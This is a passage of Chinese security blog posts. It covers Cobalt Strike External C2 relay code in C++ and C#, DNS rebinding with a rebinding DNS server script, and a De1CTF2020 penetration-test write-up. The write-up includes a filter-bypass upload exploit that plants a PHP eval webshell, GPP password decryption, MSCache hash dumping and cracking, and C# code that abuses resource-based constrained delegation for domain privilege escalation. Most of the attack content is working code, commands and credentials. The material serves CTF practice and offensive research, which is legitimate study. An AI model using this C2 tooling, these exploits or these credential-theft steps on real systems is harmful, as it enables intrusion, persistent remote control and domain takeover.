INVALID_HANDLE_VALUE) { printf(&quot;error during create readpipe.&quot;); } if (hPipeWrite == INVALID_HANDLE_VALUE) { printf(&quot;error during create writepipe.&quot;); } if (hfileServer == INVALID_HANDLE_VALUE) { printf(&quot;error during connect to beacon.&quot;); } exit(-1); } else { //一切正常 printf(&quot;all pipes are ok.\\n&quot;); } //放入客户端读管道和beacon连接 struct BRIDGE readbridge; readbridge.client = hPipeRead; readbridge.server = hfileServer; //启动客户端读管道逻辑 HANDLE hTPipeRead = CreateThread(NULL, 0, ReadOnlyPipeProcess, (LPVOID)&amp; readbridge, 0, NULL); //放入客户端写管道和beacon连接 struct BRIDGE writebridge; writebridge.client = hPipeWrite; writebridge.server = hfileServer; //启动客户端写管道逻辑 HANDLE hTPipeWrite = CreateThread(NULL, 0, WriteOnlyPipeProcess, (LPVOID)&amp; writebridge, 0, NULL); //代码没有什么意义，直接写个死循环也行 HANDLE waitHandles[] = { hPipeRead,hPipeWrite }; while (TRUE) { WaitForMultipleObjects(2, waitHandles, TRUE, INFINITE); } return 0;} 杂 其它坑点 php文件注意去BOM头%EF%BB%BF 读写管道的cpp代码 cobaltstrike 自己生成smb beacon，剥离掉第三方注入shellcode的功能。这么做的原因是实际情况中代码越短越不好杀。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147// ConsoleApplication2.cpp : This file contains the 'main' function. Program execution begins and ends there.//#include &quot;pch.h&quot;#include &lt;iostream&gt;#include &lt;WinSock2.h&gt;#include &lt;sys/stat.h&gt;#include &lt;ShellAPI.h&gt;#include &lt;Shlobj.h&gt;#pragma comment(lib,&quot;ws2_32.lib&quot;)#pragma comment(lib,&quot;user32.lib&quot;)#pragma comment(lib,&quot;Advapi32.lib&quot;) #pragma comment(lib,&quot;Shell32.lib&quot;)#pragma warning(disable:4996)using std::cout;using std::endl;// Sends data to our C2 controller received from our injected beaconvoid sendData(SOCKET sd, const char *data, DWORD len) { cout &lt;&lt; &quot;Sends data to our C2 controller received from our injected beacon&quot; &lt;&lt; endl &lt;&lt; endl; char *buffer = (char *)malloc(len + 4); if (buffer == NULL) return; DWORD bytesWritten = 0, totalLen = 0; *(DWORD *)buffer = len; memcpy(buffer + 4, data, len); while (totalLen &lt; len + 4) { bytesWritten = send(sd, buffer + totalLen, len + 4 - totalLen, 0); totalLen += bytesWritten; } free(buffer);}// Receives data from our C2 controller to be relayed to the injected beaconchar *recvData(SOCKET sd, DWORD *len) { cout &lt;&lt; &quot;Receives data from our C2 controller to be relayed to the injected beacon&quot; &lt;&lt; endl &lt;&lt; endl; char *buffer; DWORD bytesReceived = 0, totalLen = 0; *len = 0; recv(sd, (char *)len, 4, 0); buffer = (char *)malloc(*len); if (buffer == NULL) return NULL; while (totalLen &lt; *len) { bytesReceived = recv(sd, buffer + totalLen, *len - totalLen, 0); totalLen += bytesReceived; } return buffer;}// Creates a new C2 controller connection for relaying commandsSOCKET createC2Socket(const char *addr, WORD port) { cout &lt;&lt; &quot;Creates a new C2 controller connection for relaying commands&quot; &lt;&lt; endl &lt;&lt; endl; WSADATA wsd; SOCKET sd; SOCKADDR_IN sin; WSAStartup(0x0202, &amp;wsd); memset(&amp;sin, 0, sizeof(sin)); sin.sin_family = AF_INET; sin.sin_port = htons(port); sin.sin_addr.S_un.S_addr = inet_addr(addr); sd = socket(AF_INET, SOCK_STREAM, IPPROTO_IP); connect(sd, (SOCKADDR*)&amp;sin, sizeof(sin)); return sd;}// Connects to the name pipe spawned by the injected beaconHANDLE connectBeaconPipe(const char *pipeName) { cout &lt;&lt; &quot;Connects to the name pipe spawned by the injected beacon&quot; &lt;&lt; endl &lt;&lt; endl; HANDLE beaconPipe; beaconPipe = CreateFileA(pipeName, GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, NULL, NULL); return beaconPipe;}// Receives data from our injected beacon via a named pipechar *recvFromBeacon(HANDLE pipe, DWORD *len) { cout &lt;&lt; &quot;Receives data from our injected beacon via a named pipe&quot; &lt;&lt; endl &lt;&lt; endl; char *buffer; DWORD bytesRead = 0, totalLen = 0; *len = 0; ReadFile(pipe, len, 4, &amp;bytesRead, NULL); buffer = (char *)malloc(*len); while (totalLen &lt; *len) { ReadFile(pipe, buffer + totalLen, *len - totalLen, &amp;bytesRead, NULL); totalLen += bytesRead; } return buffer;}// Write data to our injected beacon via a named pipevoid sendToBeacon(HANDLE pipe, const char *data, DWORD len) { cout &lt;&lt; &quot;Write data to our injected beacon via a named pipe&quot; &lt;&lt; endl &lt;&lt; endl; DWORD bytesWritten = 0; WriteFile(pipe, &amp;len, 4, &amp;bytesWritten, NULL); WriteFile(pipe, data, len, &amp;bytesWritten, NULL);}int main(){ DWORD payloadLen = 0; char *payloadData = NULL; HANDLE beaconPipe = INVALID_HANDLE_VALUE; // Create a connection back to our C2 controller SOCKET c2socket = createC2Socket(&quot;172.16.247.10&quot;, 8081); // Loop until the pipe is up and ready to use while (beaconPipe == INVALID_HANDLE_VALUE) { cout &lt;&lt; &quot;Create our IPC pipe for talking to the C2 beacon&quot; &lt;&lt; endl &lt;&lt; endl; // Create our IPC pipe for talking to the C2 beacon Sleep(500); beaconPipe = connectBeaconPipe(&quot;\\\\\\\\.\\\\pipe\\\\xpntest&quot;); } while (true) { // Start the pipe dance payloadData = recvFromBeacon(beaconPipe, &amp;payloadLen); if (payloadLen == 0) break; sendData(c2socket, payloadData, payloadLen); free(payloadData); payloadData = recvData(c2socket, &amp;payloadLen); if (payloadLen == 0) break; sendToBeacon(beaconPipe, payloadData, payloadLen); free(payloadData); } return 0;} 管道通信只能点对点 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127using System;using System.IO;using System.IO.Pipes;using System.Threading;namespace ConsoleApp1{ class Program { static void Main(string[] args) { //connect to beacon NamedPipeClientStream pipeClient = new NamedPipeClientStream(&quot;\\\\\\\\.\\\\&quot;, &quot;xpntest&quot;, PipeDirection.InOut); Console.WriteLine(&quot;[client] Attemping to connect to pipe...&quot;); pipeClient.Connect(); Console.WriteLine(&quot;[client] connected to pipe&quot;); Console.WriteLine(&quot;[client] There are currently {0} pipe server instances open.&quot;, pipeClient.NumberOfServerInstances); StreamWriter writer = new StreamWriter(pipeClient); StreamReader reader = new StreamReader(pipeClient); writer.AutoFlush = true; //create pipe to write NamedPipeServerStream pipeWriteServer1 = new NamedPipeServerStream(&quot;hlwrite&quot;, PipeDirection.InOut); NamedPipeClientStream pipeWriteClient1 = new NamedPipeClientStream(&quot;\\\\\\\\.\\\\&quot;, &quot;hlwrite&quot;, PipeDirection.InOut); pipeWriteClient1.Connect(); StreamWriter pipeWriteClientWriter = new StreamWriter(pipeWriteClient1); pipeWriteClientWriter.AutoFlush = true; //create pipe to read NamedPipeServerStream pipeReadServer2 = new NamedPipeServerStream(&quot;hlread&quot;, PipeDirection.InOut); NamedPipeClientStream pipeReadClient2 = new NamedPipeClientStream(&quot;\\\\\\\\.\\\\&quot;, &quot;hlread&quot;, PipeDirection.InOut); pipeReadClient2.Connect(); StreamReader pipeReadClientReader = new StreamReader(pipeReadClient2); Console.WriteLine(&quot;All pipes are ok.&quot;); Thread readOnlyThread = new Thread(() =&gt; ReadOnlyPipeProcess(reader, pipeWriteClientWriter)); readOnlyThread.IsBackground = true; readOnlyThread.Start(); Thread WriteOnlyThread = new Thread(() =&gt; WriteOnlyPipeProcess(pipeReadClientReader, writer)); WriteOnlyThread.IsBackground = true; WriteOnlyThread.Start(); readOnlyThread.Join(); } public static uint read_frame(StreamReader reader, string buffer) { //First, read size. uint frame_size = 0; int i = 0; byte[] size = new byte[4]; for (i = 0; i &lt; 4; i++) { size[i] = (Byte)reader.Read(); } //Array.Reverse(size); frame_size = BitConverter.ToUInt32(size, 0); Console.WriteLine(&quot;read_frame length: {0}.&quot;, frame_size); //Second, read data byte[] data = new byte[frame_size]; for (i = 0; i &lt; frame_size; i++) { data[i] = (Byte)reader.Read(); } buffer = System.Text.Encoding.ASCII.GetString(data); Console.WriteLine(&quot;The frame data is: {0}&quot;, buffer); return frame_size; } public static void write_frame(StreamWriter writer, string buffer) { //Get buffer size int frame_size = buffer.Length; int i; Console.WriteLine(&quot;write_frame length: {0}.&quot;, frame_size); byte[] size = BitConverter.GetBytes(frame_size); //Array.Reverse(size); //First, write size for (i = 0; i &lt; size.Length; i++) { writer.Write(size[0]); } //Second, write data for (i = 0; i &lt; frame_size; i++) { writer.Write(buffer[i]); } } //read data from beacon and write into own pipe public static void ReadOnlyPipeProcess(StreamReader reader, StreamWriter writer) { string buffer = &quot;&quot;; while (true) { Console.WriteLine(&quot;Client want read.&quot;); uint length = read_frame(reader, buffer); Console.WriteLine(&quot;Read from beacon {0}.&quot;, length); write_frame(writer, buffer); buffer = &quot;&quot;; } } //read data from own pipe and write into beacon public static void WriteOnlyPipeProcess(StreamReader reader, StreamWriter writer) { string buffer = &quot;&quot;; while (true) { Console.WriteLine(&quot;Beacon want read.&quot;); uint length = read_frame(reader, buffer); Console.WriteLine(&quot;Write to beacon {0}.&quot;, length); write_frame(writer, buffer); buffer = &quot;&quot;; } } }} 参考 C#学习笔记2：多线程 解析C#中管道流的使用 StreamReader.Read Method A C# Named Pipe Library That Supports Multiple Clients CommunicationServers/Pipe/","link":"/2019/10/25/CobaltStrike%20External%20C2%E4%BF%A1%E9%81%93/"},{"title":"DNS rebinding","text":"DNS rebinding是啥 利用服务器两次解析同一域名的短暂间隙，更换域名背后的ip达到突破同源策略或过waf进行ssrf的目的。 举个例子一般，进行ssrf防御的模式如下。 获取到输入的URL，从该URL中提取host 对该host进行DNS解析，获取到解析的IP 检测该IP是否是合法的，比如是否是私有IP等 如果IP检测为合法的，则进入curl的阶段发包 这样的逻辑是有问题的，因为第二次服务端完全可以不使用url就是使用已被检查过的ip。 诚如前面所说同一url被用了两次，所以完全可以将TTL调到一个非常小的值，让第一次通过url拿到的ip失效，然后在curl的时候服务端必须再进行一次dns解析拿到ip，而这个ip没有被检查，于是就可以为所欲为了。在ssrf里面就是第一次解析出外网ip，第二次解析出内网ip。 一个demo 要实现dns重绑定一个重要的条件就是将TTL调到接近0的数字，一般的域名服务商是不允许TTL那么低的。所以只有自己搭或者自己写一个dns服务器。这里选择使用fakedns做一个简单的实验初体验。 vi一个dns.conf写 1A cl0und.site 12.34.56.78,127.0.0.1 然后分别dig两次 1dig @fakedns所在的ip cl0und.site 完整复现 当然比赛或者实战里面是不可能自己任意指定dns服务器解析，所以必须自己配置dns记录。貌似阿里是可以配置ns记录的。我用的国外的域名服务商貌似比较坑设置nameserver那里不允许用ip。 不讲道理，纠结了半天最后在ip后面加xip.io绕过。 nameserver更新的比较慢要半个小时左右。 半个小时以后~ 可以看到成功是成功了，但是ttl有300实战中应该是不可接受的。但是看源码的时候发现ttl设置的1,很迷 所以去网上偷了一个脚本 123456789101112131415161718192021222324252627282930313233343536from twisted.internet import reactor, deferfrom twisted.names import client, dns, error, serverrecord={}class DynamicResolver(object): def _doDynamicResponse(self, query): name = query.name.name if name not in record or record[name]&lt;1: ip=&quot;12.34.56.78&quot; else: ip=&quot;127.0.0.1&quot; if name not in record: record[name]=0 record[name]+=1 print name+&quot; ===&gt; &quot;+ip answer = dns.RRHeader( name=name, type=dns.A, cls=dns.IN, ttl=0, payload=dns.Record_A(address=b'%s'%ip,ttl=0) ) answers = [answer] authority = [] additional = [] return answers, authority, additional def query(self, query, timeout=None): return defer.succeed(self._doDynamicResponse(query))def main(): factory = server.DNSServerFactory( clients=[DynamicResolver(), client.Resolver(resolv='/etc/resolv.conf')] ) protocol = dns.DNSDatagramProtocol(controller=factory) reactor.listenUDP(53, protocol) reactor.run()if __name__ == '__main__': raise SystemExit(main()) 开始安装twisted库失败，安装之前要先装一下，备忘 1apt-get install build-essential autoconf libtool pkg-config python-opengl python-imaging python-pyrex python-pyside.qtopengl idle-python2.7 qt4-dev-tools qt4-designer libqtgui4 libqtcore4 libqt4-xml libqt4-test libqt4-script libqt4-network libqt4-dbus python-qt4 python-qt4-gl libgle3 python-dev 12pip install twisted==16.6.0pip install service-identity==16.0.0 后来推断应该是操作的系统的锅，空白的那一次实际上是解析出东西了的。300秒貌似是操作系统强制的（？）。 但是实际上已经成功了，在kali和centos上测了一下都是这个结果。 不稳定的偷懒方法 法一 这个方法不需要，有自己的域名和nameserver。因为有人已经帮大家实现了。只需要把想用的ip转换成16进制，比如想在127.0.0.1 和 192.168.0.1互换那么只需要，键入ip7f000001.c0a80001.rbndr.us 然后就是看脸了。随机试了一轮 123456789101112131415161718192021222324252627282930313233343536373839404142[root@localhost redis]# host 7f000001.c0a80001.rbndr.us7f000001.c0a80001.rbndr.us has address 127.0.0.1[root@localhost redis]# host 7f000001.c0a80001.rbndr.us7f000001.c0a80001.rbndr.us has address 192.168.0.1[root@localhost redis]# host 7f000001.c0a80001.rbndr.us7f000001.c0a80001.rbndr.us has address 192.168.0.1[root@localhost redis]# host 7f000001.c0a80001.rbndr.us7f000001.c0a80001.rbndr.us has address 192.168.0.1[root@localhost redis]# host 7f000001.c0a80001.rbndr.us7f000001.c0a80001.rbndr.us has address 127.0.0.1[root@localhost redis]# host 7f000001.c0a80001.rbndr.us7f000001.c0a80001.rbndr.us has address 127.0.0.1[root@localhost redis]# host 7f000001.c0a80001.rbndr.us7f000001.c0a80001.rbndr.us has address 127.0.0.1[root@localhost redis]# host 7f000001.c0a80001.rbndr.us7f000001.c0a80001.rbndr.us has address 192.168.0.1[root@localhost redis]# host 7f000001.c0a80001.rbndr.us7f000001.c0a80001.rbndr.us has address 192.168.0.1[root@localhost redis]# host 7f000001.c0a80001.rbndr.us7f000001.c0a80001.rbndr.us has address 127.0.0.1[root@localhost redis]# host 7f000001.c0a80001.rbndr.us7f000001.c0a80001.rbndr.us has address 192.168.0.1[root@localhost redis]# host 7f000001.c0a80001.rbndr.us7f000001.c0a80001.rbndr.us has address 192.168.0.1[root@localhost redis]# host 7f000001.c0a80001.rbndr.us7f000001.c0a80001.rbndr.us has address 192.168.0.1[root@localhost redis]# host 7f000001.c0a80001.rbndr.us7f000001.c0a80001.rbndr.us has address 192.168.0.1[root@localhost redis]# host 7f000001.c0a80001.rbndr.us7f000001.c0a80001.rbndr.us has address 192.168.0.1[root@localhost redis]# host 7f000001.c0a80001.rbndr.us7f000001.c0a80001.rbndr.us has address 127.0.0.1[root@localhost redis]# host 7f000001.c0a80001.rbndr.us7f000001.c0a80001.rbndr.us has address 127.0.0.1[root@localhost redis]# host 7f000001.c0a80001.rbndr.us7f000001.c0a80001.rbndr.us has address 127.0.0.1[root@localhost redis]# host 7f000001.c0a80001.rbndr.us7f000001.c0a80001.rbndr.us has address 192.168.0.1[root@localhost redis]# host 7f000001.c0a80001.rbndr.us7f000001.c0a80001.rbndr.us has address 127.0.0.1[root@localhost redis]# host 7f000001.c0a80001.rbndr.us7f000001.c0a80001.rbndr.us has address 192.168.0.1 法二 在bendawang师傅的博客看到的自己设置两个A记录一个内网,一个外网。去装外网先返回内网后返回这个概率。 参考 http://www.bendawang.site/2017/05/31/%E5%85%B3%E4%BA%8EDNS-rebinding%E7%9A%84%E6%80%BB%E7%BB%93/ https://ricterz.me/posts/Use%20DNS%20Rebinding%20to%20Bypass%20IP%20Restriction?_=1485134878505 https://github.com/taviso/rbndr/","link":"/2018/01/28/DNS%20rebinding/"},{"title":"De1tactf2020 pentest非预期解与预期解","text":"pentest1 先是一个有绕过的文件上传，这部分是其他小伙伴做的直接给exp了。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144import requestsimport reimport sysurl='http://47.113.219.76/index.php'headers={ 'Content-Type': 'multipart/form-data; boundary=----WebKitFormBoundaryhJUhA4FiLizuakBx'}data=&quot;&quot;&quot;------WebKitFormBoundaryhJUhA4FiLizuakBxContent-Disposition: form-data; name=&quot;file&quot;; filename=&quot;{}&quot;Content-Type: image/jpeg{}------WebKitFormBoundaryhJUhA4FiLizuakBxContent-Disposition: form-data; name=&quot;submit&quot;submit------WebKitFormBoundaryhJUhA4FiLizuakBx--&quot;&quot;&quot;payload=&quot;&quot;&quot;&lt;?=$_=[]?&gt;&lt;?=$_=@&quot;$_&quot;?&gt;&lt;?=$_=$_['!'=='@']?&gt;&lt;?=$_?&gt;&lt;?=$__=$_?&gt;&lt;?=$___=$_?&gt;&lt;?=$____=$_?&gt;&lt;?=$_____=$_?&gt;&lt;?=$______=$_?&gt;&lt;?=$_______=$_?&gt;&lt;?=$________=$_?&gt;&lt;?=++$__?&gt;&lt;?=++$__?&gt;&lt;?=++$__?&gt;&lt;?=++$__?&gt;&lt;?=++$__?&gt;&lt;?=++$__?&gt;&lt;?=++$__?&gt;&lt;?=++$__?&gt;&lt;?=++$__?&gt;&lt;?=++$__?&gt;&lt;?=++$__?&gt;&lt;?=++$__?&gt;&lt;?=++$__?&gt;&lt;?=++$__?&gt;&lt;?=++$__?&gt;&lt;?=++$__?&gt;&lt;?=++$__?&gt;&lt;?=++$__?&gt;&lt;?=++$___?&gt;&lt;?=++$___?&gt;&lt;?=++$___?&gt;&lt;?=++$___?&gt;&lt;?=++$___?&gt;&lt;?=++$___?&gt;&lt;?=++$___?&gt;&lt;?=++$___?&gt;&lt;?=++$___?&gt;&lt;?=++$___?&gt;&lt;?=++$___?&gt;&lt;?=++$___?&gt;&lt;?=++$___?&gt;&lt;?=++$___?&gt;&lt;?=++$___?&gt;&lt;?=++$___?&gt;&lt;?=++$___?&gt;&lt;?=++$___?&gt;&lt;?=++$___?&gt;&lt;?=++$___?&gt;&lt;?=++$___?&gt;&lt;?=++$___?&gt;&lt;?=++$___?&gt;&lt;?=++$___?&gt;&lt;?=++$____?&gt;&lt;?=++$____?&gt;&lt;?=++$____?&gt;&lt;?=++$____?&gt;&lt;?=++$____?&gt;&lt;?=++$____?&gt;&lt;?=++$____?&gt;&lt;?=++$____?&gt;&lt;?=++$____?&gt;&lt;?=++$____?&gt;&lt;?=++$____?&gt;&lt;?=++$____?&gt;&lt;?=++$____?&gt;&lt;?=++$____?&gt;&lt;?=++$____?&gt;&lt;?=++$____?&gt;&lt;?=++$____?&gt;&lt;?=++$____?&gt;&lt;?=++$____?&gt;&lt;?=++$_____?&gt;&lt;?=++$_____?&gt;&lt;?=++$_____?&gt;&lt;?=++$_____?&gt;&lt;?=++$______?&gt;&lt;?=++$______?&gt;&lt;?=++$______?&gt;&lt;?=++$______?&gt;&lt;?=++$______?&gt;&lt;?=++$______?&gt;&lt;?=++$______?&gt;&lt;?=++$______?&gt;&lt;?=++$______?&gt;&lt;?=++$______?&gt;&lt;?=++$______?&gt;&lt;?=++$______?&gt;&lt;?=++$_______?&gt;&lt;?=++$_______?&gt;&lt;?=++$_______?&gt;&lt;?=++$_______?&gt;&lt;?=++$_______?&gt;&lt;?=++$_______?&gt;&lt;?=$________='_'?&gt;&lt;?=$_________=$__.$___.$__.$____.$_____.$______?&gt;&lt;?=$__________=$________.$_______.$_____.$____?&gt;&lt;?=$____________________=$$__________?&gt;&lt;?=$____________________[_]($____________________[__],$____________________[___])?&gt;&quot;&quot;&quot;data=data.format(&quot;syc.pHp&quot;,payload)r=requests.post(url=url,headers=headers,data=data)filename=re.search(&quot;in:(uploads/.*)&quot;,r.text).group(1)filename=filename.strip()print(&quot;http://47.113.219.76/&quot;+filename)r=requests.get(&quot;http://47.113.219.76/&quot;+filename+&quot;?_=file_put_contents&amp;__=1.php&amp;___=&lt;?php eval($_POST[a]);?&gt;&quot;)print(r.status_code)print(r.text) 打完访问对应目录是下的1.php，密码是a。 连上webshell后把shell反弹到cs上，使用powerview进行信息收集可以看到，域内共享有一个hint。 12powershell-import /Users/cengsiqi/Desktop/pentest/wintool/PowerView-dev.ps1powershell get-domaincomputer|get-netshare 查看这个Hint可以发现，有一个拿flag的tip。 1shell dir \\\\dc.De1CTF2020.lab\\Hin 把提示拷贝下来下载发现这个zip需要密码才能打开。 1shell copy \\\\dc.De1CTF2020.lab\\Hint\\flag1_and_flag2hint.zip . 接着收集，域内用户信息发现有一个可疑用户。 1shell net user /dom 猜测HintZip_Pass账户密码就是解压缩的密码。这里经过一些尝试之后考虑会不会是gpp尝试ps直接导出，发现爆了个错，看意思是说当前用户不是domain user（客观事实是当前账户就是域用户）。 12powershell-import /Users/cengsiqi/Desktop/pentest/Get-GPPPassword.ps1powershell Get-GPPPassword 也不会改powershell，就直接手动遍历SYSVOL了（还好不是很多，多的话建议弹到msf上用msf的脚本搞） 123&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;&lt;Groups clsid=&quot;{3125E937-EB16-4b4c-9934-544FC6D24D26}&quot;&gt;&lt;User clsid=&quot;{DF5F1855-51E5-4d24-8B1A-D9BDE98BA1D1}&quot; name=&quot;HintZip_Pass&quot; image=&quot;2&quot; changed=&quot;2020-04-15 14:43:23&quot; uid=&quot;{D33537C1-0BDB-44B7-8628-A6030A298430}&quot;&gt;&lt;Properties action=&quot;U&quot; newName=&quot;&quot; fullName=&quot;&quot; description=&quot;&quot; cpassword=&quot;uYgjj9DCKSxqUp7gZfYzo0F6hOyiYh4VmYBXRAUp+08&quot; changeLogon=&quot;1&quot; noChange=&quot;0&quot; neverExpires=&quot;0&quot; acctDisabled=&quot;0&quot; userName=&quot;HintZip_Pass&quot;/&gt;&lt;/User&gt;&lt;/Groups&gt; 1gpp-decrypt uYgjj9DCKSxqUp7gZfYzo0F6hOyiYh4VmYBXRAUp+08 用zL1PpP@sSwO3d解密刚才的压缩包flag1_and_flag2hint.zip即可得到，第一个flag和下一关的提示。 pentest2 123456789flag1: De1CTF{GpP_11Is_SoOOO_Ea3333y}Get flag2 Hint:hint1: You need De1ta user to get flag2hint2: De1ta user's password length is 1-8, and the password is composed of [0-9a-f].hint3: Pay attention to the extended rights of De1ta user on the domain.hint4: flag2 in Domain Controller (C:\\Users\\Administrator\\Desktop\\flag.txt)PS: Please do not damage the environment after getting permission, thanks QAQ. 从提示可以看出来，出题的思路是，通过某种离线爆破的方法拿到De1ta密码，De1ta用户存在acl滥用问题以至于可以搞到域控拿下读到C:\\Users\\Administrator\\Desktop\\flag.txt。 关于如何离线爆破我这里是非预期，之前服务器web账号有特权可以juicypotato提权。 我一直没成功。 当时有其他师傅成功，给我弹了个system shell。 导出De1ta账户的mscach 1234reg save hklm\\system system.hivereg save hklm\\security security.hivepython secretsdump.py -security /Users/cengsiqi/Desktop/hash/security.hive -system /Users/cengsiqi/Desktop/hash/SYSTEM.hive LOCAL 可以拿到 1DE1CTF2020.LAB/De1ta:$DCC2$10240#De1ta#52c2cfff23d879a2ba830cf184c10b46 根据提示的密码复杂度，用hascat跑出来结果是3f23ea12。 密码有了下一步根据提示来Delta acl滥用问题。 12powershell-import /Users/cengsiqi/Desktop/pentest/wintool/PowerView-master.ps1powershell Get-ObjectAcl -Domain De1CTF2020.lab -ResolveGUIDs|?{$_.IdentityReference -eq &quot;DE1CTF2020\\De1ta&quot;} 输出出来了很多东西重点关注两个地方，第一个地方是De1ta的ExtendedRight让他具备Dcshadow的攻击的能力。 通过查阅资料可以知道Dcshadow攻击时需要De1ta这种特权账号和一个SYSTEM账号。做到这里的时候juciypotato已经修了，之前抓的administrator hash也改了。（经验不丰富，如果之前抓了机器hash也能提权了）。 接下来就需要关注第二个地方了。De1ta用户对DM机器具有WriteProperty，环境又是12，所以可以用烂番茄提权。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127using System;using System.Text;using System.Security.AccessControl;using System.Security.Principal;using System.Net;namespace Addnew_MachineAccount{ class Program { static void Main(string[] args) { String DomainController = &quot;192.168.0.12&quot;; String Domain = &quot;De1CTF2020.lab&quot;; String new_MachineAccount = &quot;lisan4&quot;; //添加的机器账户 String new_MachineAccount_password = &quot;sycl0ver&quot;; //机器账户密码 String victimcomputer = &quot;DM&quot;; //需要进行提权的机器 String victimcomputer_ldap_path = &quot;LDAP://CN=DM,CN=Computers,DC=De1CTF2020,DC=lab&quot;; String machine_account = new_MachineAccount; String sam_account = machine_account + &quot;$&quot;; String distinguished_name = &quot;&quot;; String[] DC_array = null; distinguished_name = &quot;CN=&quot; + machine_account + &quot;,CN=Computers&quot;; DC_array = Domain.Split('.'); foreach (String DC in DC_array) { distinguished_name += &quot;,DC=&quot; + DC; } Console.WriteLine(&quot;[+] Elevate permissions on &quot; + victimcomputer); Console.WriteLine(&quot;[+] Domain = &quot; + Domain); Console.WriteLine(&quot;[+] Domain Controller = &quot; + DomainController); //Console.WriteLine(&quot;[+] New SAMAccountName = &quot; + sam_account); //Console.WriteLine(&quot;[+] Distinguished Name = &quot; + distinguished_name); //连接ldap System.DirectoryServices.Protocols.LdapDirectoryIdentifier identifier = new System.DirectoryServices.Protocols.LdapDirectoryIdentifier(DomainController, 389); //NetworkCredential nc = new NetworkCredential(username, password); //使用凭据登录 System.DirectoryServices.Protocols.LdapConnection connection = null; //connection = new System.DirectoryServices.Protocols.LdapConnection(identifier, nc); connection = new System.DirectoryServices.Protocols.LdapConnection(identifier); connection.SessionOptions.Sealing = true; connection.SessionOptions.Signing = true; connection.Bind(); var request = new System.DirectoryServices.Protocols.AddRequest(distinguished_name, new System.DirectoryServices.Protocols.DirectoryAttribute[] { new System.DirectoryServices.Protocols.DirectoryAttribute(&quot;DnsHostName&quot;, machine_account +&quot;.&quot;+ Domain), new System.DirectoryServices.Protocols.DirectoryAttribute(&quot;SamAccountName&quot;, sam_account), new System.DirectoryServices.Protocols.DirectoryAttribute(&quot;userAccountControl&quot;, &quot;4096&quot;), new System.DirectoryServices.Protocols.DirectoryAttribute(&quot;unicodePwd&quot;, Encoding.Unicode.GetBytes(&quot;\\&quot;&quot; + new_MachineAccount_password + &quot;\\&quot;&quot;)), new System.DirectoryServices.Protocols.DirectoryAttribute(&quot;objectClass&quot;, &quot;Computer&quot;), new System.DirectoryServices.Protocols.DirectoryAttribute(&quot;ServicePrincipalName&quot;, &quot;HOST/&quot;+machine_account+&quot;.&quot;+Domain,&quot;RestrictedKrbHost/&quot;+machine_account+&quot;.&quot;+Domain,&quot;HOST/&quot;+machine_account,&quot;RestrictedKrbHost/&quot;+machine_account) }); try { //添加机器账户 connection.SendRequest(request); Console.WriteLine(&quot;[+] Machine account: &quot; + machine_account + &quot; Password: &quot; + new_MachineAccount_password + &quot; added&quot;); } catch (System.Exception ex) { Console.WriteLine(&quot;[-] The new machine could not be created! User may have reached ms-DS-new_MachineAccountQuota limit.)&quot;); Console.WriteLine(&quot;[-] Exception: &quot; + ex.Message); return; } // 获取新计算机对象的SID var new_request = new System.DirectoryServices.Protocols.SearchRequest(distinguished_name, &quot;(&amp;(samAccountType=805306369)(|(name=&quot; + machine_account + &quot;)))&quot;, System.DirectoryServices.Protocols.SearchScope.Subtree, null); var new_response = (System.DirectoryServices.Protocols.SearchResponse)connection.SendRequest(new_request); SecurityIdentifier sid = null; foreach (System.DirectoryServices.Protocols.SearchResultEntry entry in new_response.Entries) { try { sid = new SecurityIdentifier(entry.Attributes[&quot;objectsid&quot;][0] as byte[], 0); Console.Out.WriteLine(&quot;[+] &quot; + new_MachineAccount + &quot; SID : &quot; + sid.Value); } catch { Console.WriteLine(&quot;[!] It was not possible to retrieve the SID.\\nExiting...&quot;); return; } } //设置资源约束委派 System.DirectoryServices.DirectoryEntry myldapConnection = new System.DirectoryServices.DirectoryEntry(&quot;De1CTF2020.lab&quot;,&quot;De1ta&quot;, &quot;3f23ea12&quot;); myldapConnection.Path = victimcomputer_ldap_path; myldapConnection.AuthenticationType = System.DirectoryServices.AuthenticationTypes.Secure; System.DirectoryServices.DirectorySearcher search = new System.DirectoryServices.DirectorySearcher(myldapConnection); //通过ldap找计算机 search.Filter = &quot;(CN=&quot; + victimcomputer + &quot;)&quot;; string[] requiredProperties = new string[] { &quot;samaccountname&quot; }; foreach (String property in requiredProperties) search.PropertiesToLoad.Add(property); System.DirectoryServices.SearchResult result = null; try { result = search.FindOne(); } catch (System.Exception ex) { Console.WriteLine(ex.Message + &quot;Exiting...&quot;); return; } if (result != null) { System.DirectoryServices.DirectoryEntry entryToUpdate = result.GetDirectoryEntry(); String sec_desc = &quot;O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;&quot; + sid.Value + &quot;)&quot;; System.Security.AccessControl.RawSecurityDescriptor sd = new RawSecurityDescriptor(sec_desc); byte[] riptor_buffer = new byte[sd.BinaryLength]; sd.GetBinaryForm(riptor_buffer, 0); // 添加evilpc的sid到msds-allowedtoactonbehalfofotheridentity中 entryToUpdate.Properties[&quot;msds-allowedtoactonbehalfofotheridentity&quot;].Value = riptor_buffer; try { entryToUpdate.CommitChanges();//提交更改 Console.WriteLine(&quot;[+] Exploit successfully!&quot;); } catch (System.Exception ex) { Console.WriteLine(ex.Message); Console.WriteLine(&quot;[!] \\nFailed...&quot;); return; } } } }} 因为环境很混乱几个队伍都在相互覆盖msds-allowedtoactonbehalfofotheridentity，所以先后添加了多个spn。。lisan3$ lisan4$ 加上委派之后然后就是s4u提权了。这里踩了大坑，下面来说一下。我先用的kekeo。 12tgt::ask /user:lisan3$ /domain:De1CTF2020.lab /ntlm:30a7b270355d67451970d37ff1c9b666tgs::s4u 